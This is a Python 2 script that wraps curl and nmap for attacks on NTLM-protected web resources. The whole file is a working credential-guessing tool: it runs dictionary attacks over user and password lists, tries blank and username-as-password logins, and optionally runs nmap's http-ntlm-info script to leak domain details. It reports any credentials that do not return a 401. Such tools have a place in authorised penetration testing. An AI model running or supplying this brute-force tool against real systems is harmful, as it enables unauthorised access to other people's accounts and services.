#!/usr/bin/python
# Simple wrapper for some command line NTLM attacks

import argparse
import sys
import os.path
import subprocess
from urlparse import urlparse
import re
import time
import signal

def test_login( username, password, url ):
  global args, found, foundusers
  username = username.strip()
  password = password.strip()
  
  # Skip this attempt if we already have credentials for this user
  if username in foundusers:
    return False

  print "[*] Testing " + username + " : " + password 
  # cmd = "curl -s -I --ntlm --user " + username + ":" + password + " -k " + url
  try:
    out = subprocess.check_output( ["curl", "-s", "-I", "--ntlm", "--user", username + ":" + password, "-k", url] )
    m = re.findall( "HTTP\/1.\d (\d{3})", out )
    for code in m:
      if code != "401":
        print "[+] FOUND: " + username + " : " + password
        found.append( username + " : " + password )
        foundusers.append( username )
        if args.quitonsuccess:
          sys.exit(0)
        if args.delay:
          time.sleep(args.delay)
        return True
    
    if args.delay:
      time.sleep(args.delay)
  except KeyboardInterrupt:
    cancel_handler()
  except:
    print 'ERROR: curl call failed'
  return False

def show_found():
  if len( found ) > 0: print "Found:\n - " + "\n - ".join(found)
  else: print "No creds found :(" 

def cancel_handler(signal=None,frame=None):
  print "Caught ctrl-c, quitting..."
  show_found()
  sys.exit(0)

signal.signal(signal.SIGINT, cancel_handler)

parser = argparse.ArgumentParser(description="Wrapper for NTLM info leak and NTLM dictionary attack")
parser.add_argument("-u", "--user", help="Username to dictionary attack as")
parser.add_argument("-U", "--userlist", help="Username list to dictionary attack as")
parser.add_argument("-p", "--password", help="Password to dictionary attack as")
parser.add_argument("-d", "--domain", help="NTLM domain name to attack")
parser.add_argument("-P", "--passlist", help="Password list to dictionary attack as")
parser.add_argument("-D", "--delay", help="Delay between each attempt, in seconds")
parser.add_argument("-i", "--info", action="store_true", help="Exploit NTLM info leak")
parser.add_argument("-s", "--same", action="store_true", help="Try password=username")
parser.add_argument("-b", "--blank", action="store_true", help="Try blank password")
parser.add_argument("-1", "--quitonsuccess", action="store_true", help="Stop as soon as the first credential is found")
parser.add_argument("url", help="URL of NTLM protected resource")
args = parser.parse_args()

if not args.url:
  parser.print_usage()
  sys.exit(2)

if args.delay:
  args.delay = int(args.delay)

url = urlparse(args.url)
if not url.port:
  if url.scheme == 'https':
    port = 443
  else:
    port = 80
else:
  port = url.port

found = []
foundusers = []

print 'Running against ' + url.geturl()

if args.info:
  # Run NTLM info leak
  cmd = "nmap -p" + str(port) + " --script http-ntlm-info --script-args http-ntlm-info.root="+url.path+" "+url.netloc
  print cmd
  os.system( cmd )

if ( args.user or args.userlist ) and ( args.password or args.passlist ):
  # Check user
  if args.userlist and not os.path.isfile(args.userlist):
    print 'Couldn\'t find ' + args.userlist
    parser.print_usage()
    sys.exit(2)

  # Check password
  if args.passlist and not os.path.isfile(args.passlist):
    print 'Couldn\'t find ' + args.passlist
    parser.print_usage()
    sys.exit(2)
  
  if args.passlist:
    print "Password list"
    fp = open( args.passlist, "r" )
    
    if args.user:
      if args.same:
        test_login( args.user, args.user, url.geturl() )
      if args.blank:
        test_login( args.user, '', url.geturl() )
    elif args.userlist:
      fu = open( args.userlist, "r" )
      for u in fu:
        # Loop over blank / same for when multiple passes and users
        if args.same:
          test_login( u, u, url.geturl() )
        if args.blank:
          test_login( u, '', url.geturl() )
      fu.close()

    for p in fp:
      if args.userlist:
        fu = open( args.userlist, "r" )
        for u in fu:
          # many users, many passwords
          test_login( u, p, url.geturl() )
        fu.close()
      else:
        # One user, many passwords
        test_login( args.user, p, url.geturl() )
    fp.close()
  elif args.userlist:
    print "User list"
    fu = open( args.userlist, "r" )
    for u in fu:
      # Many users, one password
      test_login( u, args.password, url.geturl() )
      if args.same:
        test_login( u, u, url.geturl() )
      if args.blank:
        test_login( u, '', url.geturl() )
    fu.close()
  else:
    # One user, one password
    print "Single user / password" 
    if args.blank:
      test_login( args.user, '', url.geturl() )
    if args.same:
      test_login( args.user, args.user, url.geturl() )
    test_login( args.user, args.password, url.geturl() )
 
  show_found()

print "Done"
